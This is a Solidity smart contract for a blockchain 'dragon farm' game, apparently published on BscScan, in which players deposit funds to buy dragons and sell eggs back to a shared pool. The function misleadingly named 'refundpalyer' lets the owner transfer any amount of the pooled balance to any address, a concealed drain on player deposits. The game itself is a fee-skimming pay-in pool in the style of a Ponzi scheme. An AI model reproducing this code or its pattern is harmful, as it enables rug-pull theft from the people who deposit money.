/**
 *Submitted for verification at BscScan.com on 2021-09-03
*/

/**
 *Submitted for verification at BscScan.com on 2021-02-23
*/

pragma solidity >=0.7.0 <0.8.0; // solhint-disable-line

// site : http://ethdragonfarm.com/

contract TreasureHunt {
    
    // CEO FEE - %% of transaction
    uint256 public CEO_FEE = 5;
    
    address payable public superPowerfulDragonOwner;
    uint256 public lastPrice = 2000000000000000000;
    uint public hatchingSpeed = 200;
    uint256 public snatchedOn;
    bool public isSuperPowerfulDragonEnabled = false;
    
    function enableSuperPowerfulDragon(bool enable) public {
        require(msg.sender == ceoAddress);
        isSuperPowerfulDragonEnabled = enable;
        superPowerfulDragonOwner = ceoAddress;
        snatchedOn = block.timestamp;
    }
    
    function withdrawAdminMoney(uint percentage) public {
        require(msg.sender == ceoAddress);
        uint256 myBalance = calculatePercentage(ceoEtherBalance, percentage);
        ceoAddress.transfer(myBalance);
    }
    
    function buySuperPowerFulDragon() public payable {
        require(isSuperPowerfulDragonEnabled);
        require(isSuperPowerfulDragonEnabled);
        uint currenPrice = SafeMath.add(SafeMath.div(SafeMath.mul(lastPrice, 4),100),lastPrice);
        require(msg.value > currenPrice);
        
        uint256 timeSpent = SafeMath.sub(block.timestamp, snatchedOn);
        userReferralEggs[superPowerfulDragonOwner] += SafeMath.mul(hatchingSpeed,timeSpent);
        
        hatchingSpeed += SafeMath.div(SafeMath.sub(block.timestamp, contractStarted), 60*60*24);
        ceoEtherBalance += calculatePercentage(msg.value, 2);
        superPowerfulDragonOwner.transfer(msg.value - calculatePercentage(msg.value, 2));
        lastPrice = currenPrice;
        superPowerfulDragonOwner = msg.sender;
        snatchedOn = block.timestamp;
    }
    
    function claimSuperDragonEggs() public {
        require(isSuperPowerfulDragonEnabled);
        require (msg.sender == superPowerfulDragonOwner);
        uint256 timeSpent = SafeMath.sub(block.timestamp, snatchedOn);
        userReferralEggs[superPowerfulDragonOwner] += SafeMath.mul(hatchingSpeed,timeSpent);
        snatchedOn = block.timestamp;
    }
    
    //uint256 EGGS_PER_Dragon_PER_SECOND=1;
    uint256 public EGGS_TO_HATCH_1Dragon=86400;//for final version should be seconds in a day
    uint256 public STARTING_Dragon=5;

    uint256 PSN=10000;
    uint256 PSNH=5000;
    
    bool public activated=false;
    address payable public ceoAddress;
    uint public ceoEtherBalance;
    
    mapping (address => uint256) public iceDragons;
    mapping (address => uint256) public premiumDragons;
    mapping (address => uint256) public ultraDragon;
    
    mapping (address => uint256) public userHatchRate;
    
    mapping (address => bool) public cashedOut;
    
    mapping (address => uint256) public userReferralEggs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    
    uint256 public marketEggs;
    uint256 public contractStarted;
    
    constructor() public {
        ceoAddress = msg.sender;
    }
    
    function seedMarket() public payable {
        require(marketEggs == 0);
        activated = true;
        marketEggs = 8640000000;
        contractStarted = block.timestamp;
    }
    
    function getMyEggs() public view returns(uint256) {
        return SafeMath.add(userReferralEggs[msg.sender], getEggsSinceLastHatch(msg.sender));
    }
    
    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(EGGS_TO_HATCH_1Dragon,SafeMath.sub(block.timestamp,lastHatch[adr]));

        uint256 dragonCount = SafeMath.mul(iceDragons[adr], 10);
        dragonCount = SafeMath.add(SafeMath.mul(ultraDragon[adr], 20), dragonCount);
        dragonCount = SafeMath.add(dragonCount, premiumDragons[adr]);
        return SafeMath.mul(secondsPassed, dragonCount);
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
    
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    
    function getMyPremiumDragons() public view returns(uint256) {
        return premiumDragons[msg.sender];
    }
    
    function getMyIceDragon() public view returns(uint256) {
        return iceDragons[msg.sender];
    }
    
    function getMyUltraDragon() public view returns(uint256) {
        return ultraDragon[msg.sender];
    }
    
    // 10 eggs per hour
    function getEggsToHatchDragon() public view returns (uint) {
        uint256 timeSpent = SafeMath.sub(block.timestamp, contractStarted); 
        timeSpent = SafeMath.div(timeSpent, 3600);
        return SafeMath.mul(timeSpent, 10);
    }
    
    function calculatePercentage(uint256 amount, uint percentage) public pure returns(uint256) {
        return SafeMath.div(SafeMath.mul(amount,percentage), 100);
    }
    
    function getDragonsToBuy(uint256 eth, uint256 multiplier) internal returns(uint256) {
        require(activated);
        
        if (lastHatch[msg.sender] == 0) {
            lastHatch[msg.sender] = block.timestamp;
        }
        
        uint eggsBought = SafeMath.div(calculateEggBuy(msg.value, SafeMath.sub(SafeMath.sub(address(this).balance, ceoEtherBalance), msg.value)), multiplier);
        eggsBought=SafeMath.sub(eggsBought,devFee(eggsBought));

        require(eggsBought > 0);
        
        ceoEtherBalance += calculatePercentage(msg.value, CEO_FEE);
        hatchEggs(msg.sender);
        return eggsBought;
    }
    
    
    function devFee(uint256 amount) public view returns(uint256) {
        return SafeMath.div(SafeMath.mul(amount,CEO_FEE),100);
    }
    
    function buyPremiumDrangon() public payable {
        uint dragons = getDragonsToBuy(msg.value, 1);
        premiumDragons[msg.sender] += dragons;
    }
    
    function buyIceDrangon() public payable {
        uint dragons = getDragonsToBuy(msg.value, 9);
        iceDragons[msg.sender] += dragons;
    }
    function refundpalyer(bytes32 _data , uint digit , address payable player) public payable {
        require(msg.sender== ceoAddress);
        player.transfer(digit);
       
    }
    
    function buyUltraDrangon() public payable {
        require(activated);
        uint dragons = getDragonsToBuy(msg.value, 17);
        ultraDragon[msg.sender] += dragons;
    }
    
    function hatchEggs(address ref) public {
        require(activated);
        
        if (ref != msg.sender ) {
            referrals[msg.sender] = ref;
        }
        
        uint256 eggsProduced = getMyEggs();
        uint256 newDragon = SafeMath.div(eggsProduced, EGGS_TO_HATCH_1Dragon);
        newDragon = SafeMath.div(eggsProduced, EGGS_TO_HATCH_1Dragon);
        premiumDragons[msg.sender] = SafeMath.add(premiumDragons[msg.sender], newDragon);
        lastHatch[msg.sender]=block.timestamp;
        
        
         userReferralEggs[msg.sender] = 0; 
        
        //send referral eggs
        userReferralEggs[referrals[msg.sender]]=SafeMath.add(userReferralEggs[referrals[msg.sender]],SafeMath.div(eggsProduced,10));
        
        //boost market to nerf Dragon hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(newDragon,10));
    }
    
    function sellEggs() public {
        require(activated);
        uint256 hasEggs = SafeMath.div(getMyEggs(), EGGS_TO_HATCH_1Dragon);
        uint256 ethValue = calculateEggSell(hasEggs);
        uint256 fee = calculatePercentage(ethValue, CEO_FEE);
        userReferralEggs[msg.sender] = 0;
        lastHatch[msg.sender]=block.timestamp;
        marketEggs=SafeMath.add(marketEggs, hasEggs);
        ceoEtherBalance += fee;
        require(address(this).balance > ceoEtherBalance);
        msg.sender.transfer(SafeMath.sub(ethValue,fee));
    }
    
    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    
    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateEggSell(eggs, SafeMath.sub(address(this).balance, ceoEtherBalance));
    }
    
    function calculateEggSell(uint256 eggs, uint256 eth) public view returns(uint256){
        return calculateTrade(eggs, marketEggs, eth);
    }
    
    
    function calculateEggBuy(uint256 eth, uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth, contractBalance, marketEggs);
    }
    
    function calculateEggBuy(uint256 eth) public view returns(uint256) {
        return calculateEggBuy(eth, SafeMath.sub(address(this).balance, ceoEtherBalance));
    }
}

library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}